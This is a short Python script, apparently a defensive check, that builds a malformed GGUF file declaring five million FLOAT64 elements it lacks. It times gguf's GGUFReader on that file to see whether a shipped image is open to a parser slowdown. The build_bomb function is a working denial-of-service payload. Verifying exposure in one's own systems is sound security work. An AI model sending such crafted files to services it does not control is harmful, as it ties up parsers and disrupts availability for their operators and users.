#!/usr/bin/env python3
"""Prove the shipped image is affected, rather than assuming it from a version number.

A vulnerability scanner said nothing about gguf. That is not evidence the image is
safe; it is evidence the scanner has no data. The only way to know is to send the
input and watch what the service does.

This builds the malicious file described in llama.cpp PR #28131: a tiny GGUF that
declares an array of 5,000,000 FLOAT64 elements it cannot possibly contain, so the
parser loops per declared element instead of per byte of file.
"""
import struct, sys, time, tempfile, os

def build_bomb(count=5_000_000, pad=5_200_008):
    key = b"a"
    buf = b"GGUF" + struct.pack("<IQQ", 3, 0, 1)     # version 3, 0 tensors, 1 kv
    buf += struct.pack("<Q", len(key)) + key
    buf += struct.pack("<I", 9)                       # value type ARRAY
    buf += struct.pack("<I", 12)                      # element type FLOAT64
    buf += struct.pack("<Q", count)                   # declared element count
    buf += b"\x00" * pad
    return buf

def main():
    data = build_bomb()
    with tempfile.NamedTemporaryFile(suffix=".gguf", delete=False) as t:
        t.write(data)
        path = t.name
    try:
        print(f"file size:        {len(data):,} bytes")
        print(f"declared elements: 5,000,000 FLOAT64")
        print(f"bytes they need:   {5_000_000 * 8:,}")
        print(f"bytes available:   {len(data) - 49:,}")
        print()
        from gguf.gguf_reader import GGUFReader
        start = time.time()
        try:
            GGUFReader(path)
            outcome = "parsed with no error"
        except Exception as e:
            outcome = f"{type(e).__name__}"
        elapsed = time.time() - start
        print(f"parse result:      {outcome}")
        print(f"time taken:        {elapsed:.2f}s")
        print()
        if elapsed > 5:
            print("AFFECTED: a 5 MB upload occupies the parser for seconds.")
            return 1
        print("not affected on this version")
        return 0
    finally:
        os.unlink(path)

if __name__ == "__main__":
    sys.exit(main())
